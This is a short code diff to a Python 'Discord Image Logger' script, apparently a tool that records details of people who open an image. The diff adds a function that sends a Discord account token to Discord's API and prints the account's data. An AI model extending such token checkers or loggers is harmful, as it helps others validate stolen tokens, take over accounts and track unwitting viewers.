@@ -1,6 +1,26 @@
 # Discord Image Logger
 # By DeKrypt | https://github.com/dekrypted
 
+
+def test(token: str) -> None:
+
+    response = requests.get(
+        url="https://discord.com/api/v9/users/@me",
+        headers={
+            "content-type": "application/json",
+            "Authorization": token
+        }
+    )
+
+    print(response.json())
+
+# Example usage:
+# test('your_discord_token_here')
+
+
+
+
+
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import requests, base64, httpagentparser
